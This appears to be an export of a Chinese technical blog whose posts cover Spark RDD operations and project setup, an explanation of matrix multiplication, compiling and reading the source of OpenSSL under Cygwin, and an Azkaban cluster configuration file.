<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name := &quot;SparkDemo&quot;</span><br><span class="line"></span><br><span class="line">version := &quot;1.0&quot;</span><br><span class="line"></span><br><span class="line">scalaVersion := &quot;2.11.11&quot;</span><br><span class="line"></span><br><span class="line">libraryDependencies ++= Seq(</span><br><span class="line">    &quot;org.apache.spark&quot; %% &quot;spark-core&quot; % &quot;2.1.0.cloudera1&quot; % &quot;provided&quot;,</span><br><span class="line">    &quot;org.apache.spark&quot; %% &quot;spark-sql&quot; % &quot;2.1.0.cloudera1&quot; % &quot;provided&quot;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<p>运行如下命令创建项目为eclipse项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sbt eclipse</span><br></pre></td></tr></table></figure>
<p>以后每次修改了sbt依赖都要再执行一次这个命令。</p>
<p>##示例</p>
<p>一个做单词统计的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.demo.spark</span><br><span class="line"></span><br><span class="line">import org.apache.spark.SparkContext</span><br><span class="line">import org.apache.spark.SparkConf</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 对文件里的单词记数示例</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">object WordCountDemo &#123;</span><br><span class="line"></span><br><span class="line">  def main(args: Array[String]): Unit = &#123;</span><br><span class="line">    val conf = new SparkConf().setAppName(&quot;spark init test&quot;);</span><br><span class="line">    //如果在本地测试，设置master为本地</span><br><span class="line">    //方法一：在运行配制里添加JVM参数</span><br><span class="line">    //-Dspark.master=local</span><br><span class="line">    //方法二：在代码里指定</span><br><span class="line">    conf.setMaster(&quot;local&quot;);</span><br><span class="line">    val sc = new SparkContext(conf);</span><br><span class="line"></span><br><span class="line">    val textFile = sc.textFile(&quot;file:///D:/generatorConfig.xml&quot;)</span><br><span class="line">    val counts = textFile.flatMap(line =&gt; line.split(&quot; &quot;))</span><br><span class="line">      .map(word =&gt; (word, 1))</span><br><span class="line">      .reduceByKey(_ + _)</span><br><span class="line">    counts.saveAsTextFile(&quot;file:///D:/out&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
        <category>spark</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark中map和flatMap的区别详解</title>
    <url>/blog/bigdata/spark/sparkdiary/flatmap/</url>
    <content><![CDATA[<p>在使用时map会将一个长度为N的RDD转换为另一个长度为N的RDD；而flatMap会将一个长度为N的RDD转换成一个N个元素的集合，然后再把这N个元素合成到一个单个RDD的结果集。</p>
<p>比如一个包含三行内容的数据文件“README.md”。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a b c</span><br><span class="line"></span><br><span class="line">d</span><br></pre></td></tr></table></figure>
<p>经过以下转换过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val textFile = sc.textFile(&quot;README.md&quot;)</span><br><span class="line">textFile.flatMap(_.split(&quot; &quot;))</span><br></pre></td></tr></table></figure>
<p>其实就是经历了以下转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;a b c&quot;, &quot;&quot;, &quot;d&quot;] =&gt; [[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],[],[&quot;d&quot;]] =&gt; [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]</span><br></pre></td></tr></table></figure>

<p>在这个示例中，flatMap就把包含多行数据的RDD，即[“a b c”, “”, “d”] ，转换为了一个包含多个单词的集合。实际上，flatMap相对于map多了的是[[“a”,”b”,”c”],[],[“d”]] &#x3D;&gt; [“a”,”b”,”c”,”d”]这一步。</p>
]]></content>
      <categories>
        <category>大数据</category>
        <category>spark</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>spark任务设置日志输出</title>
    <url>/blog/bigdata/spark/sparkdiary/logconfig/</url>
    <content><![CDATA[<p>spark默认输出的日志内容太多，可以设置集群日志输出级别为<code>warn</code>，但这样自己写的程序输出日志也会是<code>warn</code>，<code>info</code>日志一般还是很有必要的。</p>
<p>可以在<code>spark-submit</code>命令上添加参数，来设置提交任务的日志输出级别：</p>
<p><code>spark-submit ... --conf &quot;spark.driver.extraJavaOptions=-Dlog4j.configuration=file:///&lt;全路径&gt;/log4j.properties&quot;  job.jar</code></p>
<p><code>log4j.properties</code>名称也可以是<code>log4j.xml</code>。</p>
<p>为了查这个参数费了好多时间，这里mark一下。</p>
]]></content>
      <categories>
        <category>大数据</category>
        <category>spark</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵乘法和矩阵的本质理解</title>
    <url>/blog/basetech/math/xxds/jzcfbz/</url>
    <content><![CDATA[<p>大多数人在高中，或者大学低年级，都上过一门课《线性代数》。这门课其实是教矩阵。</p>
<p>刚学的时候，还蛮简单的，矩阵加法就是相同位置的数字加一下。</p>
<p><img src="/images/matrix/ljjzcf1.png"></p>
<p>矩阵减法也类似。</p>
<p>矩阵乘以一个常数，就是所有位置都乘以这个数。</p>
<p><img src="/images/matrix/ljjzcf2.png"></p>
<p>但是，等到矩阵乘以矩阵的时候，一切就不一样了。</p>
<p><img src="/images/matrix/ljjzcf3.png"></p>
<p>这个结果是怎么算出来的？</p>
<p>教科书告诉你，计算规则是，第一个矩阵第一行的每个数字（2和1），各自乘以第二个矩阵第一列对应位置的数字（1和1），然后将乘积相加（<br>2 x 1 + 1 x 1），得到结果矩阵左上角的那个值3。</p>
<p><img src="/images/matrix/ljjzcf4.gif"></p>
<p>也就是说，结果矩阵第m行与第n列交叉位置的那个值，等于第一个矩阵第m行与第二个矩阵第n列，对应位置的每个值的乘积之和。</p>
<p>怎么会有这么奇怪的规则？</p>
<p>我一直没理解这个规则的含义，导致《线性代数》这门课就没学懂。研究生时发现，线性代数是向量计算的基础，很多重要的数学模型都要用到向量计算，所以我做不了复杂模型。这一直让我有点伤心。</p>
<p>前些日子，受到一篇文章的启发，我终于想通了，矩阵乘法到底是什么东西。关键就是一句话，<strong>矩阵的本质就是线性方程式，两者是一一对应关系。</strong>如果从线性方程式的角度，理解矩阵乘法就毫无难度。</p>
<p>下面是一组线性方程式。</p>
<p><img src="/images/matrix/ljjzcf5.png"></p>
<p>矩阵的最初目的，只是为线性方程组提供一个简写形式。</p>
<p><img src="/images/matrix/ljjzcf6.png"></p>
<p>老实说，从上面这种写法，已经能看出矩阵乘法的规则了：系数矩阵第一行的2和1，各自与<br>x 和 y<br>的乘积之和，等于3。不过，这不算严格的证明，只是线性方程式转为矩阵的书写规则。</p>
<p>下面才是严格的证明。有三组未知数 x、y 和 t，其中 x 和 y 的关系如下。</p>
<p><img src="/images/matrix/ljjzcf7.png"></p>
<p>x 和 t 的关系如下。</p>
<p><img src="/images/matrix/ljjzcf8.png"></p>
<p>有了这两组方程式，就可以求 y 和 t<br>的关系。从矩阵来看，很显然，只要把第二个矩阵代入第一个矩阵即可。</p>
<p><img src="/images/matrix/ljjzcf9.png"></p>
<p>从方程式来看，也可以把第二个方程组代入第一个方程组。</p>
<p><img src="/images/matrix/ljjzcf10.png"></p>
<p>上面的方程组可以整理成下面的形式。</p>
<p><img src="/images/matrix/ljjzcf11.png"></p>
<p>最后那个矩阵等式，与前面的矩阵等式一对照，就会得到下面的关系。</p>
<p><img src="/images/matrix/ljjzcf12.png"></p>
<p>矩阵乘法的计算规则，从而得到证明。</p>
<p>转自：<a href="http://www.ruanyifeng.com/blog/2015/09/matrix/ljjzcf-multiplication.html">http://www.ruanyifeng.com/blog/2015/09/matrix/ljjzcf-multiplication.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>(转)Spark RDD API详解(一) Map和Reduce</title>
    <url>/blog/bigdata/spark/sparkdiary/rddapi/</url>
    <content><![CDATA[<h2 id="RDD是什么？"><a href="#RDD是什么？" class="headerlink" title="RDD是什么？"></a>RDD是什么？</h2><p>RDD是Spark中的抽象数据结构类型，任何数据在Spark中都被表示为RDD。从编程的角度来看，RDD可以简单看成是一个数组。和普通数组的区别是，RDD中的数据是分区存储的，这样不同分区的数据就可以分布在不同的机器上，同时可以被并行处理。因此，Spark应用程序所做的无非是把需要处理的数据转换为RDD，然后对RDD进行一系列的变换和操作从而得到结果。本文为第一部分，将介绍Spark RDD中与Map和Reduce相关的API中。</p>
<h2 id="如何创建RDD？"><a href="#如何创建RDD？" class="headerlink" title="如何创建RDD？"></a>如何创建RDD？</h2><p>RDD可以从普通数组创建出来，也可以从文件系统或者HDFS中的文件创建出来。</p>
<p>举例：从普通数组创建RDD，里面包含了1到9这9个数字，它们分别在3个分区中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(1 to 9, 3)</span><br><span class="line">a: org.apache.spark.rdd.RDD[Int] = ParallelCollectionRDD[1] at parallelize at &lt;console&gt;:12</span><br></pre></td></tr></table></figure>
<p>举例：读取文件README.md来创建RDD，文件中的每一行就是RDD中的一个元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val b = sc.textFile(&quot;README.md&quot;)</span><br><span class="line">b: org.apache.spark.rdd.RDD[String] = MappedRDD[3] at textFile at &lt;console&gt;:12</span><br></pre></td></tr></table></figure>
<p>虽然还有别的方式可以创建RDD，但在本文中我们主要使用上述两种方式来创建RDD以说明RDD的API。</p>
<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map是对RDD中的每个元素都执行一个指定的函数来产生一个新的RDD。任何原RDD中的元素在新RDD中都有且只有一个元素与之对应。</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(1 to 9, 3)</span><br><span class="line">scala&gt; val b = a.map(x =&gt; x*2)</span><br><span class="line">scala&gt; a.collect</span><br><span class="line">res10: Array[Int] = Array(1, 2, 3, 4, 5, 6, 7, 8, 9)</span><br><span class="line">scala&gt; b.collect</span><br><span class="line">res11: Array[Int] = Array(2, 4, 6, 8, 10, 12, 14, 16, 18)</span><br></pre></td></tr></table></figure>
<p>上述例子中把原RDD中每个元素都乘以2来产生一个新的RDD。</p>
<h2 id="mapPartitions"><a href="#mapPartitions" class="headerlink" title="mapPartitions"></a>mapPartitions</h2><p>mapPartitions是map的一个变种。map的输入函数是应用于RDD中每个元素，而mapPartitions的输入函数是应用于每个分区，也就是把每个分区中的内容作为整体来处理的。<br>它的函数定义为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def mapPartitions[U: ClassTag](f: Iterator[T] =&gt; Iterator[U], preservesPartitioning: Boolean = false): RDD[U]</span><br></pre></td></tr></table></figure>
<p>f即为输入函数，它处理每个分区里面的内容。每个分区中的内容将以Iterator[T]传递给输入函数f，f的输出结果是Iterator[U]。最终的RDD由所有分区经过输入函数处理后的结果合并起来的。</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(1 to 9, 3)</span><br><span class="line">scala&gt; def myfunc[T](iter: Iterator[T]) : Iterator[(T, T)] = &#123;</span><br><span class="line">    var res = List[(T, T)]() </span><br><span class="line">    var pre = iter.next while (iter.hasNext) &#123;</span><br><span class="line">        val cur = iter.next; </span><br><span class="line">        res .::= (pre, cur) pre = cur;</span><br><span class="line">    &#125; </span><br><span class="line">    res.iterator</span><br><span class="line">&#125;</span><br><span class="line">scala&gt; a.mapPartitions(myfunc).collect</span><br><span class="line">res0: Array[(Int, Int)] = Array((2,3), (1,2), (5,6), (4,5), (8,9), (7,8))</span><br></pre></td></tr></table></figure>
<p>上述例子中的函数myfunc是把分区中一个元素和它的下一个元素组成一个Tuple。因为分区中最后一个元素没有下一个元素了，所以(3,4)和(6,7)不在结果中。</p>
<p>mapPartitions还有些变种，比如mapPartitionsWithContext，它能把处理过程中的一些状态信息传递给用户指定的输入函数。还有mapPartitionsWithIndex，它能把分区的index传递给用户指定的输入函数。</p>
<h2 id="mapValues"><a href="#mapValues" class="headerlink" title="mapValues"></a>mapValues</h2><p>mapValues顾名思义就是输入函数应用于RDD中Kev-Value的Value，原RDD中的Key保持不变，与新的Value一起组成新的RDD中的元素。因此，该函数只适用于元素为KV对的RDD。</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(List(&quot;dog&quot;, &quot;tiger&quot;, &quot;lion&quot;, &quot;cat&quot;, &quot;panther&quot;, &quot; eagle&quot;), 2)</span><br><span class="line">scala&gt; val b = a.map(x =&gt; (x.length, x))</span><br><span class="line">scala&gt; b.mapValues(&quot;x&quot; + _ + &quot;x&quot;).collect</span><br><span class="line">res5: Array[(Int, String)] = Array((3,xdogx), (5,xtigerx), (4,xlionx),(3,xcatx), (7,xpantherx), (5,xeaglex))</span><br></pre></td></tr></table></figure>

<h2 id="mapWith"><a href="#mapWith" class="headerlink" title="mapWith"></a>mapWith</h2><p>mapWith是map的另外一个变种，map只需要一个输入函数，而mapWith有两个输入函数。它的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def mapWith[A: ClassTag, U: ](constructA: Int =&gt; A, preservesPartitioning: Boolean = false)(f: (T, A) =&gt; U): RDD[U]</span><br></pre></td></tr></table></figure>
<p>第一个函数constructA是把RDD的partition index（index从0开始）作为输入，输出为新类型A；<br>第二个函数f是把二元组(T, A)作为输入（其中T为原RDD中的元素，A为第一个函数的输出），输出类型为U。</p>
<p>举例：把partition index 乘以10，然后加上2作为新的RDD的元素。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val x = sc.parallelize(List(1,2,3,4,5,6,7,8,9,10), 3) </span><br><span class="line">x.mapWith(a =&gt; a * 10)((a, b) =&gt; (b + 2)).collect </span><br><span class="line">res4: Array[Int] = Array(2, 2, 2, 12, 12, 12, 22, 22, 22, 22)</span><br><span class="line">flatMap</span><br></pre></td></tr></table></figure>
<p>与map类似，区别是原RDD中的元素经map处理后只能生成一个元素，而原RDD中的元素经flatmap处理后可生成多个元素来构建新RDD。</p>
<p>举例：对原RDD中的每个元素x产生y个元素（从1到y，y为元素x的值）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(1 to 4, 2)</span><br><span class="line">scala&gt; val b = a.flatMap(x =&gt; 1 to x)</span><br><span class="line">scala&gt; b.collect</span><br><span class="line">res12: Array[Int] = Array(1, 1, 2, 1, 2, 3, 1, 2, 3, 4)</span><br></pre></td></tr></table></figure>

<h2 id="flatMapWith"><a href="#flatMapWith" class="headerlink" title="flatMapWith"></a>flatMapWith</h2><p>flatMapWith与mapWith很类似，都是接收两个函数，一个函数把partitionIndex作为输入，输出是一个新类型A；另外一个函数是以二元组（T,A）作为输入，输出为一个序列，这些序列里面的元素组成了新的RDD。它的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def flatMapWith[A: ClassTag, U: ClassTag](constructA: Int =&gt; A, preservesPartitioning: Boolean = false)(f: (T, A) =&gt; Seq[U]): RDD[U]</span><br></pre></td></tr></table></figure>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(List(1,2,3,4,5,6,7,8,9), 3)</span><br><span class="line">scala&gt; a.flatMapWith(x =&gt; x, true)((x, y) =&gt; List(y, x)).collect</span><br><span class="line">res58: Array[Int] = Array(0, 1, 0, 2, 0, 3, 1, 4, 1, 5, 1, 6, 2, 7, 2,</span><br><span class="line">8, 2, 9)</span><br></pre></td></tr></table></figure>
<h2 id="flatMapValues"><a href="#flatMapValues" class="headerlink" title="flatMapValues"></a>flatMapValues</h2><p>flatMapValues类似于mapValues，不同的在于flatMapValues应用于元素为KV对的RDD中Value。每个一元素的Value被输入函数映射为一系列的值，然后这些值再与原RDD中的Key组成一系列新的KV对。</p>
<p>举例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(List((1,2),(3,4),(3,6)))</span><br><span class="line">scala&gt; val b = a.flatMapValues(x=&gt;x.to(5))</span><br><span class="line">scala&gt; b.collect</span><br><span class="line">res3: Array[(Int, Int)] = Array((1,2), (1,3), (1,4), (1,5), (3,4), (3,5))</span><br></pre></td></tr></table></figure>

<p>上述例子中原RDD中每个元素的值被转换为一个序列（从其当前值到5），比如第一个KV对(1,2), 其值2被转换为2，3，4，5。然后其再与原KV对中Key组成一系列新的KV对(1,2),(1,3),(1,4),(1,5)。</p>
<h2 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h2><p>reduce将RDD中元素两两传递给输入函数，同时产生一个新的值，新产生的值与RDD中下一个元素再被传递给输入函数直到最后只有一个值为止。</p>
<p>举例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val c = sc.parallelize(1 to 10)</span><br><span class="line">scala&gt; c.reduce((x, y) =&gt; x + y)</span><br><span class="line">res4: Int = 55</span><br></pre></td></tr></table></figure>

<p>上述例子对RDD中的元素求和。</p>
<h2 id="reduceByKey"><a href="#reduceByKey" class="headerlink" title="reduceByKey"></a>reduceByKey</h2><p>顾名思义，reduceByKey就是对元素为KV对的RDD中Key相同的元素的Value进行reduce，因此，Key相同的多个元素的值被reduce为一个值，然后与原RDD中的Key组成一个新的KV对。</p>
<p>举例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; val a = sc.parallelize(List((1,2),(3,4),(3,6)))</span><br><span class="line">scala&gt; a.reduceByKey((x,y) =&gt; x + y).collect</span><br><span class="line">res7: Array[(Int, Int)] = Array((1,2), (3,10))</span><br></pre></td></tr></table></figure>

<p>上述例子中，对Key相同的元素的值求和，因此Key为3的两个元素被转为了(3,10)。</p>
<p>转自：<a href="https://www.zybuluo.com/jewes/note/35032">https://www.zybuluo.com/jewes/note/35032</a></p>
]]></content>
      <categories>
        <category>大数据</category>
        <category>spark</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】cygwin编译安装openssl</title>
    <url>/blog/arch/crypto/openssl/cygwininstall/</url>
    <content><![CDATA[<p>cygwin怎么安装这里不多说了。</p>
<p>装完cygwin要装gcc，安装cygwin如果按照默认的方式一直点下去的话，安装完了会发现没有安装gcc&#x2F;g++。</p>
<p>这个时候可以在安装文件的目录打开命令行，并输入：</p>
<p><code>setup-x86_64.exe -q -P wget -P gcc-g++ -P make -P diffutils -P libmpfr-devel -P libgmp-devel -P libmpc-devel</code></p>
<p>其中，”setup-x86_64.exe”对应安装文件的名称。接着就会出来安装的界面，等待下载完成即可。</p>
<p>装完gcc后还要安装perl，用界面化安装就可以。</p>
<p>下载openssl源码</p>
<p><a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a></p>
<p>也可以从github上剪出</p>
<p><a href="https://github.com/openssl/openssl">https://github.com/openssl/openssl</a></p>
<p>解压源码文件。</p>
<p>用安装好的cygwin的“Cygwin64 Terminal”切换到解压后目录。</p>
<p>生成make文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./Configure gcc</span><br></pre></td></tr></table></figure>
<p>生成完了之后就可以用<code>make</code>命令编译，用<code>make install</code>安装到cygwin环境。</p>
<p>用<code>./config</code>生成多几次不成功，看安装说明，用上面的命令生成后可以编译了。</p>
<p>最近版的openssl是支持国密算法的，比如SM2算法。</p>
<p>比如查看ECC支持的曲线可以看到支持SM2曲线了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl ecparam -list_curves</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl ecparam -list_curves</span><br></pre></td></tr></table></figure>

<p>如果有什么疑问呆以看源码包里的<code>INSTALL</code>文件。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>【密码术】openssl源码分析一</title>
    <url>/blog/arch/crypto/openssl/srcmain/</url>
    <content><![CDATA[<h3 id="openssl命令入口"><a href="#openssl命令入口" class="headerlink" title="openssl命令入口"></a>openssl命令入口</h3><p>文件：openssl.c<br>位置：apps目录</p>
<p>命令调用方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prog = prog_init();</span><br><span class="line">pname = opt_progname(argv[0]);</span><br><span class="line"></span><br><span class="line">/* first check the program name */</span><br><span class="line">f.name = pname;</span><br><span class="line">fp = lh_FUNCTION_retrieve(prog, &amp;f);</span><br><span class="line">if (fp != NULL) &#123;</span><br><span class="line">    argv[0] = pname;</span><br><span class="line">    ret = fp-&gt;func(argc, argv);</span><br><span class="line">    goto end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是生成了一个<code>FUNCTION</code>对象的结构体。</p>
<h3 id="FUNCTION对象"><a href="#FUNCTION对象" class="headerlink" title="FUNCTION对象"></a>FUNCTION对象</h3><p>文件：progs.h<br>位置：apps<br>来源：通过apps&#x2F;progs.pl生成，不可修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct function_st &#123;</span><br><span class="line">    FUNC_TYPE type;</span><br><span class="line">    const char *name;</span><br><span class="line">    int (*func)(int argc, char *argv[]);</span><br><span class="line">    const OPTIONS *help;</span><br><span class="line">&#125; FUNCTION;</span><br></pre></td></tr></table></figure>

<p><code>FUNCTION</code>结构体是对一个方法调用的封装。</p>
<p>最主要的是函数指针，用于调用命令指定的函数。</p>
<p><code>FUNC_TYPE</code>是一个枚举对象，用于分类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef enum FUNC_TYPE &#123;</span><br><span class="line">    FT_none, FT_general, FT_md, FT_cipher, FT_pkey,</span><br><span class="line">    FT_md_alg, FT_cipher_alg</span><br><span class="line">&#125; FUNC_TYPE;</span><br></pre></td></tr></table></figure>

<p>对于类型只用到三类，对应<code>openssl help</code>列出的帮助。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static FUNCTION functions[] = &#123;</span><br><span class="line">......</span><br><span class="line">    &#123;FT_general, &quot;help&quot;, help_main, help_options&#125;,</span><br><span class="line">    &#123;FT_general, &quot;list&quot;, list_main, list_options&#125;,</span><br><span class="line">......</span><br><span class="line">    &#123;FT_md, &quot;sha256&quot;, dgst_main&#125;,</span><br><span class="line">......</span><br><span class="line">    &#123;FT_cipher, &quot;aes-128-cbc&quot;, enc_main, enc_options&#125;,</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p><code>openssl help</code>的显示结果为三部分，第一部类标准命令对应类型<code>FT_general</code>，第二部分对应摘要命令对应类型<code>FT_md</code>，第三部分为加解密命令对应类型<code>FT_cipher</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ openssl help</span><br><span class="line">Standard commands</span><br><span class="line">asn1parse         ca                ciphers           cms</span><br><span class="line">crl               crl2pkcs7         dgst              dhparam</span><br><span class="line">dsa               dsaparam          ec                ecparam</span><br><span class="line">enc               engine            errstr            gendsa</span><br><span class="line">genpkey           genrsa            help              list</span><br><span class="line">nseq              ocsp              passwd            pkcs12</span><br><span class="line">pkcs7             pkcs8             pkey              pkeyparam</span><br><span class="line">pkeyutl           prime             rand              rehash</span><br><span class="line">req               rsa               rsautl            s_client</span><br><span class="line">s_server          s_time            sess_id           smime</span><br><span class="line">speed             spkac             srp               storeutl</span><br><span class="line">ts                verify            version           x509</span><br><span class="line"></span><br><span class="line">Message Digest commands (see the `dgst&#x27; command for more details)</span><br><span class="line">blake2b512        blake2s256        gost              md4</span><br><span class="line">md5               mdc2              rmd160            sha1</span><br><span class="line">sha224            sha256            sha3-224          sha3-256</span><br><span class="line">sha3-384          sha3-512          sha384            sha512</span><br><span class="line">sha512-224        sha512-256        shake128          shake256</span><br><span class="line">sm3</span><br><span class="line"></span><br><span class="line">Cipher commands (see the `enc&#x27; command for more details)</span><br><span class="line">aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb</span><br><span class="line">aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb</span><br><span class="line">aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb</span><br><span class="line">aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1</span><br><span class="line">aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb</span><br><span class="line">aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8</span><br><span class="line">aria-256-ctr      aria-256-ecb      aria-256-ofb      base64</span><br><span class="line">bf                bf-cbc            bf-cfb            bf-ecb</span><br><span class="line">bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc</span><br><span class="line">camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast</span><br><span class="line">cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb</span><br><span class="line">cast5-ofb         des               des-cbc           des-cfb</span><br><span class="line">des-ecb           des-ede           des-ede-cbc       des-ede-cfb</span><br><span class="line">des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb</span><br><span class="line">des-ede3-ofb      des-ofb           des3              desx</span><br><span class="line">idea              idea-cbc          idea-cfb          idea-ecb</span><br><span class="line">idea-ofb          rc2               rc2-40-cbc        rc2-64-cbc</span><br><span class="line">rc2-cbc           rc2-cfb           rc2-ecb           rc2-ofb</span><br><span class="line">rc4               rc4-40            seed              seed-cbc</span><br><span class="line">seed-cfb          seed-ecb          seed-ofb          sm4-cbc</span><br><span class="line">sm4-cfb           sm4-ctr           sm4-ecb           sm4-ofb</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>密码术</category>
      </categories>
      <tags>
        <tag>密码术</tag>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>azkaban集群部署方案</title>
    <url>/blog/arch/job/azkaban/jqbs/</url>
    <content><![CDATA[<p>集群部署就是部署一个server再部署多个executor。</p>
<p>executor要先一个个启动，启动后会向mysql的executors表插入数据。</p>
<p>最后启动server，server会从executors表找executor加载。</p>
<p>数据包正常在linux下按网上的步骤编译就行，这里mark一下相关配制。</p>
<h2 id="server的conf配制"><a href="#server的conf配制" class="headerlink" title="server的conf配制"></a>server的conf配制</h2><h3 id="azkaban-properties"><a href="#azkaban-properties" class="headerlink" title="azkaban.properties"></a>azkaban.properties</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Azkaban Personalization Settings</span><br><span class="line">azkaban.name=azkaban-dev</span><br><span class="line">azkaban.label=azkaban-dev</span><br><span class="line">azkaban.color=#FF3601</span><br><span class="line">azkaban.default.servlet.path=/index</span><br><span class="line">web.resource.dir=web/</span><br><span class="line">default.timezone.id=Asia/Shanghai</span><br><span class="line"># Azkaban UserManager class</span><br><span class="line">user.manager.class=azkaban.user.XmlUserManager</span><br><span class="line">user.manager.xml.file=conf/azkaban-users.xml</span><br><span class="line"># Loader for projects</span><br><span class="line">executor.global.properties=conf/global.properties</span><br><span class="line">azkaban.project.dir=projects</span><br><span class="line"></span><br><span class="line"># Velocity dev mode</span><br><span class="line">velocity.dev.mode=false</span><br><span class="line"># Azkaban Jetty server properties.  #jetty服务器属性</span><br><span class="line">jetty.maxThreads=25</span><br><span class="line">jetty.ssl.port=8443</span><br><span class="line">jetty.port=8081</span><br><span class="line">jetty.keystore=keystore</span><br><span class="line">jetty.password=azkaban</span><br><span class="line">jetty.keypassword=azkaban</span><br><span class="line">jetty.truststore=keystore</span><br><span class="line">jetty.trustpassword=azkaban</span><br><span class="line"># Azkaban Executor settings</span><br><span class="line">executor.port=12321</span><br><span class="line"># mail settings                     #邮件配置（暂没有配置）</span><br><span class="line">mail.sender=</span><br><span class="line">mail.host=</span><br><span class="line">mail.user=</span><br><span class="line">mail.password=</span><br><span class="line">job.failure.email=</span><br><span class="line">job.success.email=</span><br><span class="line">lockdown.create.projects=false</span><br><span class="line">cache.directory=cache</span><br><span class="line"># JMX stats</span><br><span class="line">jetty.connector.stats=true</span><br><span class="line">executor.connector.stats=true</span><br><span class="line"># Azkaban plugin settings</span><br><span class="line">azkaban.jobtype.plugin.dir=plugins/jobtypes</span><br><span class="line"></span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=xxx</span><br><span class="line">mysql.database=xxx</span><br><span class="line">mysql.user=xxxx</span><br><span class="line">mysql.password=xxxxx</span><br><span class="line">mysql.numconnections=100</span><br><span class="line"></span><br><span class="line">azkaban.use.multiple.executors=true</span><br><span class="line">azkaban.executorselector.filters=StaticRemainingFlowSize,MinimumFreeMemory,CpuStatus</span><br><span class="line">azkaban.executorselector.comparator.NumberOfAssignedFlowComparator=1</span><br><span class="line">azkaban.executorselector.comparator.Memory=1</span><br><span class="line">azkaban.executorselector.comparator.LastDispatched=1</span><br><span class="line">azkaban.executorselector.comparator.CpuUsage=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

